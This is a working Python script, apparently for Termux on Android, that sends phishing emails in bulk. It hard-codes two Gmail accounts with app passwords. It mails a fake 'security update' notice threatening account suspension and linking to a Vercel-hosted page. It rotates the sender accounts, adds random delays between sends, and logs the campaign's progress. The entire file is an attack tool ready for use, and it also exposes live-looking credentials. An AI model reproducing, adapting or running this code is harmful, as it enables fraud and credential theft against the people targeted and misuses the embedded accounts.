#!/data/data/com.termux/files/usr/bin/python3
import smtplib
import time
import random
import os
from datetime import datetime

# ========== CONFIG ==========
SENDERS = [
    {
        "email": "tskforcests@gmail.com",
        "password": "zbdh eovg eosl ittv"
    },
    {
        "email": "stsvxpmain@gmail.com",
        "password": "wkhq qgxy kqau idyu"
    }
]

# PHISHING TEMPLATE
SUBJECT = "IMPORTANT UPDATE"
MESSAGE = """Dear User,

A new security update is required for your account to maintain access.

Please complete the verification process immediately:
http://update-private-conn.vercel.app

Failure to update within 24 hours may result in temporary account suspension.

Best regards,
Security Team"""

DELAY_MIN = 15  # Reduced from 30
DELAY_MAX = 45  # Reduced from 90

TARGETS_FILE = "targz.txt"
LOG_FILE = "sniper_log.txt"
# ============================

def load_targets():
    """Load targets from file"""
    if not os.path.exists(TARGETS_FILE):
        print(f"[!] File not found: {TARGETS_FILE}")
        print(f"[+] Creating sample file with test targets...")
        with open(TARGETS_FILE, "w") as f:
            for i in range(1, 11):
                f.write(f"target{i}@example.com\n")
        return [f"target{i}@example.com" for i in range(1, 11)]
    
    with open(TARGETS_FILE, "r") as f:
        targets = [line.strip() for line in f if line.strip()]
    
    return targets

def log_action(message):
    """Log to file and print"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    
    with open(LOG_FILE, "a") as f:
        f.write(log_entry + "\n")
    
    print(log_entry)
    return log_entry

def send_email(sender_email, sender_password, target_email):
    """Send one email"""
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
        server.starttls()
        server.login(sender_email, sender_password)
        
        msg = f"Subject: {SUBJECT}\n\n{MESSAGE}"
        server.sendmail(sender_email, target_email, msg)
        server.quit()
        
        return True
    except Exception as e:
        log_action(f"[ERROR] Failed to {target_email}: {str(e)[:50]}")
        return False

def main():
    print("\n" + "="*60)
    print("[+] SMTP SNIPER - SECURITY UPDATE CAMPAIGN")
    print("="*60)
    
    # Load targets
    targets = load_targets()
    total_targets = len(targets)
    
    print(f"[+] Targets loaded: {total_targets}")
    print(f"[+] Senders ready: {len(SENDERS)}")
    print(f"[+] Delay range: {DELAY_MIN}-{DELAY_MAX}s (FAST MODE)")
    print(f"[+] Subject: {SUBJECT}")
    print(f"[+] Link: http://update-private-conn.vercel.app")
    print(f"[+] Log file: {LOG_FILE}")
    print("="*60)
    
    if total_targets == 0:
        print("[!] No targets found. Add emails to targz.txt")
        return
    
    # Show warning
    print("\n[⚠] CAMPAIGN DETAILS:")
    print(f"   Subject: {SUBJECT}")
    print(f"   Link: http://update-private-conn.vercel.app")
    print(f"   Targets: {total_targets}")
    print(f"   Estimated time: {(total_targets * (DELAY_MIN+DELAY_MAX)/2)/60:.1f} minutes")
    
    # Confirm start
    confirm = input("\n[?] Type 'GO' to start: ").strip().upper()
    if confirm != "GO":
        print("[!] Cancelled")
        return
    
    sent_count = 0
    failed_count = 0
    current_sender_index = 0
    
    start_time = datetime.now()
    
    print("\n" + "="*60)
    print("[+] STARTING CAMPAIGN")
    print("="*60)
    
    for i, target in enumerate(targets, 1):
        # Get current sender (rotate)
        sender = SENDERS[current_sender_index]
        current_sender_index = (current_sender_index + 1) % len(SENDERS)
        
        # Send email
        success = send_email(sender["email"], sender["password"], target)
        
        if success:
            sent_count += 1
            print(f"[✓] Email sent to ---> {target}")
        else:
            failed_count += 1
        
        # Progress update every 5 emails (more frequent)
        if i % 5 == 0 or i == total_targets:
            progress = (i / total_targets) * 100
            elapsed = (datetime.now() - start_time).total_seconds()
            emails_per_hour = (i / elapsed * 3600) if elapsed > 0 else 0
            
            print(f"[~] Progress: {i}/{total_targets} ({progress:.1f}%)")
            print(f"[~] Success: {sent_count} | Failed: {failed_count}")
            print(f"[~] Rate: {emails_per_hour:.1f} emails/hour")
        
        # Check if last target
        if i < total_targets:
            delay = random.randint(DELAY_MIN, DELAY_MAX)
            
            # Show short countdown for small delays
            if delay <= 30:
                print(f"[⏱] Next in {delay}s", end="", flush=True)
                for sec in range(delay, 0, -1):
                    if sec % 10 == 0 or sec <= 5:
                        print(f" {sec}", end="", flush=True)
                    time.sleep(1)
                print()
            else:
                mins = delay // 60
                secs = delay % 60
                if mins > 0:
                    print(f"[⏱] Next in {mins}m {secs}s...")
                else:
                    print(f"[⏱] Next in {secs}s...")
                time.sleep(delay)
    
    # Final statistics
    end_time = datetime.now()
    total_duration = (end_time - start_time).total_seconds()
    
    print("\n" + "="*60)
    print("[+] CAMPAIGN COMPLETE")
    print("="*60)
    print(f"[+] Total targets: {total_targets}")
    print(f"[+] Successfully sent: {sent_count}")
    print(f"[+] Failed: {failed_count}")
    
    if total_targets > 0:
        success_rate = (sent_count/total_targets*100)
        print(f"[+] Success rate: {success_rate:.1f}%")
        print(f"[+] Total time: {total_duration:.0f}s ({total_duration/60:.1f} minutes)")
        print(f"[+] Average per email: {total_duration/total_targets:.1f}s")
        print(f"[+] Average speed: {total_targets/(total_duration/3600):.1f} emails/hour")
    
    print(f"[+] Log saved: {LOG_FILE}")
    print("="*60)
    
    # Save final log
    log_action(f"SECURITY UPDATE CAMPAIGN: {sent_count}/{total_targets} sent")
    log_action(f"Link used: http://update-private-conn.vercel.app")

def quick_setup():
    """Create necessary files"""
    if not os.path.exists(TARGETS_FILE):
        print(f"[+] Creating {TARGETS_FILE}...")
        with open(TARGETS_FILE, "w") as f:
            sample_targets = [
                "test1@example.com",
                "test2@example.com",
                "test3@example.com"
            ]
            for target in sample_targets:
                f.write(target + "\n")
        print(f"[+] Edit {TARGETS_FILE} with your actual targets")
    
    # Display current template
    print("\n" + "="*60)
    print("[+] EMAIL TEMPLATE LOADED:")
    print("="*60)
    print(f"SUBJECT: {SUBJECT}")
    print("-"*60)
    print(MESSAGE)
    print("="*60)
    
    print(f"\n[+] Configuration ready")
    print(f"[+] Add target emails to: {TARGETS_FILE}")
    print(f"[+] Delays: {DELAY_MIN}-{DELAY_MAX}s (Fast mode)")

if __name__ == "__main__":
    quick_setup()
    print("\n[+] Starting Security Update Campaign...")
    time.sleep(3)
    main()
